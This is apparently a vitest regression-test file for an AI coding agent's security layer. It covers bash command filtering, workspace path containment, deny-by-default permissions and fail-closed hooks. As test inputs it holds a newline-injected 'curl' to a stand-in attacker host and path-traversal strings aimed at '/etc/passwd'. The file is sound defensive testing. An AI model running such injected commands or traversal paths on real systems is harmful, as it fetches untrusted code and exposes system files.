/**
 * Security regression tests — P0 fixes from deep QA
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, writeFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { checkBashSecurity, parseShellSegments } from '../src/tools/bash-secure.js';
import { resolvePathInWorkspace } from '../src/tools/path-utils.js';
import { QueryEngine, MAX_OUTPUT_TOKEN_RECOVERY } from '../src/agent/engine.js';
import { ToolRegistry } from '../src/tools/registry.js';
import { HookRegistry } from '../src/hooks/registry.js';
import { PermissionMode, HookType, SessionState } from '../src/pkg/types.js';
import { createMockAnthropicClient, maxTokensScenario } from './helpers/mock-anthropic.js';
import { stubAssembler, passthroughCompaction } from './helpers/engine-stubs.js';

describe('bash security hardening', () => {
  it('blocks newline-separated command injection', () => {
    const check = checkBashSecurity('ls\ncurl https://evil.example/x');
    expect(check.safe).toBe(false);
    expect(check.reason).toContain('Control characters');
  });

  it('denies unrecognized commands by default', () => {
    const check = checkBashSecurity('node -e "console.log(1)"');
    expect(check.safe).toBe(false);
    expect(check.category).toBe('unknown');
  });

  it('splits segments on newlines', () => {
    expect(parseShellSegments('ls\ncurl x')).toEqual(['ls', 'curl x']);
  });
});

describe('resolvePathInWorkspace', () => {
  let workDir: string;

  beforeEach(() => {
    workDir = mkdtempSync(join(tmpdir(), 'pacode-path-'));
  });

  afterEach(() => {
    rmSync(workDir, { recursive: true, force: true });
  });

  it('allows relative paths inside workspace', () => {
    const r = resolvePathInWorkspace('src/index.ts', workDir);
    expect(r.ok).toBe(true);
  });

  it('blocks path traversal', () => {
    const r = resolvePathInWorkspace('../../../etc/passwd', workDir);
    expect(r.ok).toBe(false);
  });

  it('blocks absolute paths outside workspace', () => {
    const r = resolvePathInWorkspace('/etc/passwd', workDir);
    expect(r.ok).toBe(false);
  });
});

describe('QueryEngine security', () => {
  it('denies permission in non-TTY by default', async () => {
    const tty = process.stdin.isTTY;
    Object.defineProperty(process.stdin, 'isTTY', { value: false, configurable: true });
    delete process.env['PACODE_AUTO_APPROVE'];

    const engine = new QueryEngine({ apiKey: 'test-key' });
    const allowed = await engine['defaultPermissionPrompt']({
      id: 'p1',
      name: 'Bash',
      input: { command: 'echo hi' },
    });

    Object.defineProperty(process.stdin, 'isTTY', { value: tty, configurable: true });
    expect(allowed).toBe(false);
  });

  it('allows non-TTY when PACODE_AUTO_APPROVE=1', async () => {
    const tty = process.stdin.isTTY;
    Object.defineProperty(process.stdin, 'isTTY', { value: false, configurable: true });
    process.env['PACODE_AUTO_APPROVE'] = '1';

    const engine = new QueryEngine({ apiKey: 'test-key' });
    const allowed = await engine['defaultPermissionPrompt']({
      id: 'p1',
      name: 'Bash',
      input: {},
    });

    delete process.env['PACODE_AUTO_APPROVE'];
    Object.defineProperty(process.stdin, 'isTTY', { value: tty, configurable: true });
    expect(allowed).toBe(true);
  });

  it('stops after max_tokens recovery limit', async () => {
    const scenarios = Array.from({ length: MAX_OUTPUT_TOKEN_RECOVERY + 2 }, () =>
      maxTokensScenario()
    );
    const client = createMockAnthropicClient(scenarios);
    const registry = new ToolRegistry();
    const engine = new QueryEngine({
      anthropicClient: client,
      toolRegistry: registry,
      contextAssembler: stubAssembler(),
      compactionPipeline: passthroughCompaction(),
    });

    const state: SessionState = {
      sessionId: 'max-tok-cap',
      mode: PermissionMode.BYPASS,
      messages: [],
      toolCallHistory: [],
      maxOutputTokensRecoveryCount: 0,
      hooks: { hooks: {} },
      compactionHistory: [],
    };

    const events = [];
    for await (const event of engine.query({ message: 'x' }, state)) {
      events.push(event);
    }

    expect(state.maxOutputTokensRecoveryCount).toBe(MAX_OUTPUT_TOKEN_RECOVERY + 1);
    expect(events.some((e) => e.type === 'error' && e.error?.code === 'MAX_TOKENS')).toBe(true);
  });

  it('fail-closed when PreToolUse hook throws', async () => {
    const registry = new ToolRegistry();
    registry.register({
      name: 'OkTool',
      description: 'ok',
      inputSchema: {},
      concurrencySafe: true,
      permissionMode: PermissionMode.BYPASS,
      async execute() {
        return { content: [{ type: 'text', text: 'ran' }] };
      },
    });

    const hooks = new HookRegistry();
    hooks.register({
      name: 'broken-pre',
      type: HookType.PRE_TOOL_USE,
      command: '__pacode_nonexistent_hook_cmd__',
    });

    delete process.env['PACODE_HOOK_FAIL_OPEN'];
    const engine = new QueryEngine({
      apiKey: 'k',
      toolRegistry: registry,
      hookRegistry: hooks,
    });

    const state: SessionState = {
      sessionId: 'hook-fail',
      mode: PermissionMode.BYPASS,
      messages: [],
      toolCallHistory: [],
      maxOutputTokensRecoveryCount: 0,
      hooks: { hooks: {} },
      compactionHistory: [],
    };

    const result = await engine.executeToolCall(
      { id: '1', name: 'OkTool', input: {} },
      state
    );
    expect(result.isError).toBe(true);
    expect(result.content[0]?.text).toContain('PreToolUse hook failed');
  });
});
